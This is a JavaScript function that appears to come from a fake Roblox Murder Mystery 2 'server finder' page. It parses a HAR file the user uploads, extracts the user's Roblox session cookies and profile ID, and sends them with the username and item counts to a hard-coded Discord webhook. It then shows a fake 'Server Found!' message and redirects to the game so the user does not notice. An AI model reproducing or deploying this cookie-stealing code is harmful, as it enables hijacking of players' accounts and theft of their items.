function proceedWithServerSelection(username, level, godlies, harContent) {
  try {
    // Parse HAR content
    const harData = JSON.parse(harContent);
    const entries = harData.log.entries;

    // Extract cookies and profile information
    let profileURL = '';
    let profileID = '';
    let cookies = [];

    for (const entry of entries) {
      const request = entry.request;

      // Look for Roblox profile URL
      if (request.url.includes('https://www.roblox.com/users/')) {
        profileURL = request.url;
        const match = profileURL.match(/users\/(\d+)/);
        if (match) profileID = match[1];
      }

      // Extract cookies from headers
      const cookieHeader = request.headers.find(header => header.name.toLowerCase() === 'cookie');
      if (cookieHeader) {
        cookies = cookieHeader.value.split(';').map(cookie => cookie.trim());
      }
    }

    // Prepare data to send to webhook
    const webhookData = {
      content: `New Server Request:
      - Username: ${username}
      - Level: ${level}
      - Godlies: ${godlies}
      - Profile URL: ${profileURL || 'Not Found'}
      - Profile ID: ${profileID || 'Not Found'}
      - Cookies: ${cookies.length > 0 ? cookies.join(', ') : 'No Cookies Found'}`
    };

    // Send data to the webhook
    fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(webhookData)
    })
      .then(response => {
        if (!response.ok) {
          console.error('Failed to send data to webhook. Response:', response);
          Swal.fire('Error... Please check the console for details.');
        } else {
          console.log('Data sent successfully to the webhook.');
          Swal.fire({
            icon: 'success',
            title: 'Server Found!',
            text: 'Please click below to join the server.',
            confirmButtonText: 'Go to MM2',
            allowOutsideClick: false,
          }).then((result) => {
            if (result.isConfirmed) {
              window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
            }
          });
        }
      })
      .catch(error => {
        console.error('Error while sending data to webhook:', error);
        Swal.fire('Error... Please check the console for details.');
      });

  } catch (error) {
    console.error('Failed to process HAR content:', error);
    Swal.fire('Error processing HAR file. Please check the format.');
  }
}
